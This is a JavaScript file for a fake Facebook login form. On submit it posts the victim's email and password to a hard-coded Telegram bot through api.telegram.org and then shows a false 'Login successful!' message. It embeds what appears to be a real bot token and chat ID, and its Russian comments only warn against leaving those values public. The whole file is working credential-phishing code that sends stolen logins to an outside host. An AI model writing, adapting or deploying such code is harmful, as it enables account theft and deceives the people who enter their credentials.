import './style.css';
const form = document.getElementById("loginForm");
const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const emailError = document.getElementById("emailError");
const passwordError = document.getElementById("passwordError");
const successMessage = document.getElementById("successMessage");

// ⚠️ ВНИМАНИЕ: Никогда не оставляй эти данные в публичном коде
const TELEGRAM_BOT_TOKEN = "7585073634:AAGNcdfRkQivbLF6hd-hrbgDS_kqlQY-pDc";  // Пример: 7585073634:AAGNcdfRkQivbLF6hd-hrbgDS_kqlQY-pDc
const TELEGRAM_CHAT_ID = "5824672129";      // Пример: 5824672129

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = emailInput.value.trim();
  const password = passwordInput.value;

  const validEmailOrPhone = /^[^\s@]+@[^\s@]+\.[^\s@]+$|^\+?[0-9]{7,15}$/;
  const isEmailValid = validEmailOrPhone.test(email);
  const isPasswordValid = password.length >= 8;

  let hasError = false;
  emailError.textContent = "";
  passwordError.textContent = "";
  successMessage.textContent = "";

  if (!email) {
    emailError.textContent = "Please enter your email.";
    hasError = true;
  }

  if (!password) {
    passwordError.textContent = "Please enter your password.";
    hasError = true;
  }

  if (!hasError) {
    // Отправка в Telegram
    const message = `🔐 Facebook Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;
    const telegramApiUrl = `https://api.telegram.org/bot$7585073634:AAGNcdfRkQivbLF6hd-hrbgDS_kqlQY-pDc/sendMessage`;

    try {
      await fetch(telegramApiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: 5824672129,
          text: message
        })
      });

      successMessage.textContent = "Login successful!";
      form.reset();
    } catch (err) {
      console.error("Failed to send message to Telegram:", err);
      successMessage.textContent = "Something went wrong. Try again later.";
    }
  }
});
